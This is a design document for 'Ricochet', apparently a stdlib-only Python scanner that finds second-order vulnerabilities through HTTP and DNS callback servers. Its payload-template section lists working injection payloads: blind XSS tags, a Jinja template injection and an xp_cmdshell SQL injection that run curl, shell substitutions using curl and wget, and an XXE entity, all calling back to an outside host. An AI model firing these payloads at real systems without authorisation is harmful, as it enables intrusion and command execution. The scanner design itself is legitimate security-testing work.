# Technology Stack: Ricochet

**Project:** Second-Order Vulnerability Detection CLI Tool
**Constraint:** Python Standard Library Only (Zero External Dependencies)
**Researched:** 2026-01-29
**Confidence:** HIGH (verified against official Python 3.12+ documentation)

## Executive Summary

Building a second-order vulnerability detection tool with stdlib-only constraints is entirely feasible. Python's standard library provides robust modules for HTTP client/server operations, DNS packet handling, HTML parsing, concurrent execution, and data persistence. The architecture maps cleanly to stdlib capabilities.

## Recommended Stack

### Core Framework

| Component | Module(s) | Version | Purpose | Rationale |
|-----------|-----------|---------|---------|-----------|
| CLI Interface | `argparse` | stdlib | Command parsing, subcommands | Industry standard for Python CLIs; supports subcommands (`inject`, `listen`, `correlate`), help generation, type validation |
| Configuration | `configparser`, `json` | stdlib | Config files, state persistence | INI-style for user config, JSON for scan state/results |
| Logging | `logging` | stdlib | Structured output, debug levels | Built-in formatters, handlers, log levels; essential for security tooling |

### HTTP Client (Injection Engine)

| Component | Module(s) | Version | Purpose | Rationale |
|-----------|-----------|---------|---------|-----------|
| HTTP Requests | `urllib.request` | stdlib | Send payloads via HTTP | Full HTTP/1.1 support, custom headers, POST bodies, cookies |
| URL Handling | `urllib.parse` | stdlib | URL construction, encoding | `urlencode()` for form data, `urljoin()` for relative URLs, `parse_qs()` for query params |
| Cookie Management | `http.cookiejar` | stdlib | Session persistence | `CookieJar` + `HTTPCookieProcessor` for authenticated scanning |
| SSL/TLS | `ssl` | stdlib | HTTPS support | Certificate handling, custom contexts for testing |

**Why `urllib.request` over raw sockets:**
- Handles HTTP protocol details (chunked encoding, redirects, compression)
- Cookie management integration
- SSL/TLS built-in
- Sufficient for injection payloads; no need for low-level socket control

### HTML Parser (Crawler/Form Extractor)

| Component | Module(s) | Version | Purpose | Rationale |
|-----------|-----------|---------|---------|-----------|
| HTML Parsing | `html.parser.HTMLParser` | stdlib | Extract forms, inputs, links | Event-driven parser; override `handle_starttag()` to capture `<form>`, `<input>`, `<a>` elements |
| Entity Handling | `html.entities` | stdlib | Decode HTML entities | Handle `&amp;`, `&#39;` in attribute values |

**Implementation Pattern:**
```python
from html.parser import HTMLParser

class FormExtractor(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == 'form':
            self.current_form = {
                'action': attrs_dict.get('action', ''),
                'method': attrs_dict.get('method', 'GET').upper(),
                'inputs': []
            }
        elif tag == 'input' and self.current_form:
            self.current_form['inputs'].append({
                'name': attrs_dict.get('name'),
                'type': attrs_dict.get('type', 'text'),
                'value': attrs_dict.get('value', '')
            })

    def handle_endtag(self, tag):
        if tag == 'form' and self.current_form:
            self.forms.append(self.current_form)
            self.current_form = None
```

### Callback Server (HTTP)

| Component | Module(s) | Version | Purpose | Rationale |
|-----------|-----------|---------|---------|-----------|
| HTTP Server | `http.server.BaseHTTPRequestHandler` | stdlib | Receive callback HTTP requests | Custom handler methods (`do_GET`, `do_POST`); access to path, headers, body |
| Threading | `http.server.ThreadingHTTPServer` | 3.7+ | Handle concurrent callbacks | Multi-threaded server; available since Python 3.7 |
| Server Control | `socketserver.TCPServer` | stdlib | Low-level server options | `allow_reuse_address`, timeout control |

**Implementation Pattern:**
```python
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import threading

class CallbackHandler(BaseHTTPRequestHandler):
    callbacks = []  # Shared state for correlation

    def do_GET(self):
        # Extract callback identifier from path/params
        callback_id = self.path.split('/')[-1]
        self.callbacks.append({
            'type': 'http',
            'id': callback_id,
            'timestamp': time.time(),
            'source_ip': self.client_address[0],
            'path': self.path,
            'headers': dict(self.headers)
        })
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass  # Suppress default logging

def start_callback_server(port=8080):
    server = ThreadingHTTPServer(('0.0.0.0', port), CallbackHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server
```

### Callback Server (DNS)

| Component | Module(s) | Version | Purpose | Rationale |
|-----------|-----------|---------|---------|-----------|
| UDP Server | `socketserver.ThreadingUDPServer` | stdlib | Receive DNS queries | UDP port 53 for DNS; threaded for concurrent requests |
| Packet Parsing | `struct` | stdlib | Parse DNS wire format | Binary unpacking with `!HHHHHH` for header, `!HHIH` for records |
| Request Handler | `socketserver.BaseRequestHandler` | stdlib | Process DNS requests | Access to `self.request` (data, socket), `self.client_address` |

**DNS Packet Parsing with struct:**
```python
import struct
import socketserver

class DNSCallbackHandler(socketserver.BaseRequestHandler):
    callbacks = []

    def handle(self):
        data, socket = self.request
        # Parse DNS header (12 bytes)
        # Format: ID, FLAGS, QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT
        header = struct.unpack('!HHHHHH', data[:12])
        query_id = header[0]

        # Parse question section to extract queried domain
        domain = self._parse_domain(data, 12)

        # Extract callback identifier from subdomain
        # e.g., "abc123.callback.attacker.com" -> "abc123"
        callback_id = domain.split('.')[0]

        self.callbacks.append({
            'type': 'dns',
            'id': callback_id,
            'timestamp': time.time(),
            'source_ip': self.client_address[0],
            'domain': domain
        })

        # Send minimal response (NXDOMAIN or valid A record)
        response = self._build_response(data, query_id)
        socket.sendto(response, self.client_address)

    def _parse_domain(self, data, offset):
        """Parse DNS domain name from wire format."""
        labels = []
        while True:
            length = data[offset]
            if length == 0:
                break
            if length & 0xC0 == 0xC0:  # Compression pointer
                pointer = struct.unpack('!H', data[offset:offset+2])[0] & 0x3FFF
                labels.append(self._parse_domain(data, pointer))
                break
            labels.append(data[offset+1:offset+1+length].decode('ascii'))
            offset += 1 + length
        return '.'.join(labels)

    def _build_response(self, query, query_id):
        """Build minimal DNS response."""
        # Response header: same ID, QR=1, RCODE=3 (NXDOMAIN)
        flags = 0x8183  # Response, recursion desired, NXDOMAIN
        header = struct.pack('!HHHHHH', query_id, flags, 1, 0, 0, 0)
        # Echo back question section
        return header + query[12:]

def start_dns_server(port=53):
    server = socketserver.ThreadingUDPServer(('0.0.0.0', port), DNSCallbackHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server
```

**Note on DNS Port 53:** Binding to port 53 requires root/administrator privileges. Consider:
- Running with `sudo` (not ideal for security tools)
- Using a high port (e.g., 5353) and configuring firewall/NAT
- Using `CAP_NET_BIND_SERVICE` capability on Linux

### Concurrency (Parallel Injection/Triggering)

| Component | Module(s) | Version | Purpose | Rationale |
|-----------|-----------|---------|---------|-----------|
| Thread Pool | `concurrent.futures.ThreadPoolExecutor` | stdlib | Parallel HTTP requests | I/O-bound work (network requests) benefits from threading; context manager support |
| Futures | `concurrent.futures.as_completed` | stdlib | Process results as available | Non-blocking result collection |
| Synchronization | `threading.Lock`, `threading.Event` | stdlib | Thread-safe callback storage | Protect shared callback list |
| Queue | `queue.Queue` | stdlib | Producer-consumer patterns | Thread-safe work distribution |

**Implementation Pattern:**
```python
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

class InjectionEngine:
    def __init__(self, max_workers=10):
        self.max_workers = max_workers
        self.lock = threading.Lock()
        self.results = []

    def inject_all(self, targets):
        """Inject payloads into all targets in parallel."""
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {
                executor.submit(self._inject_single, target): target
                for target in targets
            }
            for future in as_completed(futures):
                target = futures[future]
                try:
                    result = future.result()
                    with self.lock:
                        self.results.append(result)
                except Exception as e:
                    print(f"Injection failed for {target}: {e}")
```

### Data Persistence

| Component | Module(s) | Version | Purpose | Rationale |
|-----------|-----------|---------|---------|-----------|
| Relational Storage | `sqlite3` | stdlib | Store injections, callbacks, correlations | ACID-compliant; query by injection ID, timestamp; built-in to Python |
| JSON Serialization | `json` | stdlib | Export results, config files | Human-readable output format |

**WARNING: Never use `pickle` for external/untrusted data - arbitrary code execution risk. Use `json` for all serialization.**

**Database Schema:**
```python
import sqlite3

def init_database(db_path):
    conn = sqlite3.connect(db_path)
    conn.execute('''
        CREATE TABLE IF NOT EXISTS injections (
            id TEXT PRIMARY KEY,
            url TEXT NOT NULL,
            method TEXT NOT NULL,
            parameter TEXT NOT NULL,
            payload TEXT NOT NULL,
            payload_type TEXT NOT NULL,
            timestamp REAL NOT NULL,
            response_code INTEGER,
            response_length INTEGER
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS callbacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            callback_type TEXT NOT NULL,  -- 'http' or 'dns'
            callback_id TEXT NOT NULL,
            source_ip TEXT NOT NULL,
            timestamp REAL NOT NULL,
            raw_data TEXT,
            FOREIGN KEY (callback_id) REFERENCES injections(id)
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS correlations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            injection_id TEXT NOT NULL,
            callback_id INTEGER NOT NULL,
            delay_seconds REAL NOT NULL,
            confidence TEXT NOT NULL,
            FOREIGN KEY (injection_id) REFERENCES injections(id),
            FOREIGN KEY (callback_id) REFERENCES callbacks(id)
        )
    ''')
    conn.commit()
    return conn
```

### Payload Generation

| Component | Module(s) | Version | Purpose | Rationale |
|-----------|-----------|---------|---------|-----------|
| UUID Generation | `uuid` | stdlib | Unique callback identifiers | `uuid.uuid4()` for collision-free IDs |
| String Templates | `string.Template` | stdlib | Payload templates with substitution | Simple `$variable` substitution for callback URLs |
| Base64 Encoding | `base64` | stdlib | Encoded payloads | Bypass simple filters |
| URL Encoding | `urllib.parse.quote` | stdlib | URL-safe payloads | Proper encoding for injection points |

**Payload Template Example:**
```python
import uuid
from string import Template

PAYLOADS = {
    'xss_img': Template('<img src="http://$callback_host:$callback_port/$id">'),
    'xss_script': Template('<script src="http://$callback_host:$callback_port/$id"></script>'),
    'ssti_jinja': Template('{{config.__class__.__init__.__globals__["os"].popen("curl http://$callback_host:$callback_port/$id").read()}}'),
    'sqli_stacked': Template("'; EXEC xp_cmdshell('curl http://$callback_host:$callback_port/$id');--"),
    'cmd_curl': Template('$(curl http://$callback_host:$callback_port/$id)'),
    'cmd_wget': Template('$(wget -q http://$callback_host:$callback_port/$id)'),
    'xxe_external': Template('''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://$callback_host:$callback_port/$id">]><foo>&xxe;</foo>'''),
}

def generate_payload(payload_type, callback_host, callback_port):
    callback_id = str(uuid.uuid4())[:8]  # Short ID for readability
    template = PAYLOADS.get(payload_type)
    if not template:
        raise ValueError(f"Unknown payload type: {payload_type}")
    return callback_id, template.substitute(
        callback_host=callback_host,
        callback_port=callback_port,
        id=callback_id
    )
```

### Utility Modules

| Component | Module(s) | Version | Purpose | Rationale |
|-----------|-----------|---------|---------|-----------|
| Time/Delays | `time` | stdlib | Timestamps, rate limiting | `time.time()` for correlation, `time.sleep()` for delays |
| Path Handling | `pathlib` | stdlib | Cross-platform paths | Modern path handling for config/output files |
| Regular Expressions | `re` | stdlib | Pattern matching | Extract data from responses, validate input |
| Hashing | `hashlib` | stdlib | Content hashing | Deduplicate responses, track state changes |
| Random | `secrets` | stdlib | Cryptographically secure randomness | Secure token generation for callback IDs |

## What NOT to Use

| Avoid | Why | Use Instead |
|-------|-----|-------------|
| `requests` | External dependency | `urllib.request` |
| `aiohttp` | External dependency | `ThreadPoolExecutor` for concurrency |
| `BeautifulSoup` | External dependency | `html.parser.HTMLParser` |
| `dnspython` | External dependency | `struct` + `socketserver.UDPServer` |
| `click`/`typer` | External dependency | `argparse` |
| `httpx` | External dependency | `urllib.request` |
| `asyncio` for HTTP | Complexity overkill | `ThreadPoolExecutor` (I/O-bound, threading sufficient) |
| `multiprocessing` | Overkill for I/O-bound work | `threading`/`concurrent.futures` |
| Raw `socket` for HTTP | Reinventing HTTP protocol | `urllib.request` handles protocol details |

## Architecture Mapping

| Ricochet Component | Primary Modules | Notes |
|--------------------|-----------------|-------|
| **CLI Interface** | `argparse` | Subcommands: `inject`, `listen`, `trigger`, `correlate`, `report` |
| **Injection Engine** | `urllib.request`, `urllib.parse`, `html.parser`, `concurrent.futures` | Crawl, parse forms, inject in parallel |
| **Payload Generator** | `uuid`, `string.Template`, `base64`, `urllib.parse` | Generate unique payloads per injection |
| **HTTP Callback Server** | `http.server.ThreadingHTTPServer`, `BaseHTTPRequestHandler` | Catch blind XSS, SSRF, XXE callbacks |
| **DNS Callback Server** | `socketserver.ThreadingUDPServer`, `struct` | Catch DNS exfiltration, blind XXE |
| **Trigger Engine** | `urllib.request`, `concurrent.futures` | Re-crawl to trigger stored payloads |
| **Correlation Engine** | `sqlite3`, `json` | Match callbacks to injections by ID |
| **Reporting** | `json`, `pathlib` | Export findings in JSON format |

## Version Requirements

**Minimum Python Version:** 3.9
**Recommended Python Version:** 3.11+

| Feature | Minimum Version | Notes |
|---------|-----------------|-------|
| `ThreadingHTTPServer` | 3.7 | Pre-built threaded HTTP server |
| `ssl.create_default_context()` | 3.4 | Modern TLS defaults |
| `pathlib` | 3.4 | Cross-platform paths |
| f-strings | 3.6 | Readable string formatting |
| `dataclasses` | 3.7 | Clean data structures (optional) |
| `typing` improvements | 3.9 | Better type hints |
| `tomllib` | 3.11 | TOML config parsing (optional) |

## Installation

```bash
# No installation needed - stdlib only
python3 --version  # Verify 3.9+

# That's it. No pip install, no requirements.txt, no virtualenv required.
```

## Testing Stack

| Component | Module(s) | Purpose |
|-----------|-----------|---------|
| Unit Tests | `unittest` | Test individual components |
| Mocking | `unittest.mock` | Mock HTTP responses, network calls |
| Temporary Files | `tempfile` | Isolated test databases |
| Assertions | `unittest.TestCase` | Standard assertion methods |

## Sources

**Official Python Documentation (HIGH confidence):**
- [asyncio module](https://docs.python.org/3/library/asyncio.html)
- [http.server module](https://docs.python.org/3/library/http.server.html)
- [socketserver module](https://docs.python.org/3/library/socketserver.html)
- [argparse module](https://docs.python.org/3/library/argparse.html)
- [urllib.request module](https://docs.python.org/3/library/urllib.request.html)
- [html.parser module](https://docs.python.org/3/library/html.parser.html)
- [concurrent.futures module](https://docs.python.org/3/library/concurrent.futures.html)
- [socket module](https://docs.python.org/3/library/socket.html)
- [struct module](https://docs.python.org/3/library/struct.html)

**DNS Implementation References (MEDIUM confidence):**
- [Implement DNS in a Weekend - Build a DNS query](https://implement-dns.wizardzines.com/book/part_1)
- [Implement DNS in a Weekend - Parse the response](https://implement-dns.wizardzines.com/book/part_2)

**Second-Order Vulnerability Research (MEDIUM confidence):**
- [A Web Second-Order Vulnerabilities Detection Method (IEEE)](https://ieeexplore.ieee.org/document/8533318/)
- [Detecting Second Order DoS Vulnerabilities (ACM)](https://dl.acm.org/doi/10.1145/2810103.2813680)

**Python CLI Best Practices (MEDIUM confidence):**
- [Real Python: Build CLIs with argparse](https://realpython.com/command-line-interfaces-python-argparse/)
- [Real Python: urllib.request](https://realpython.com/urllib-request/)
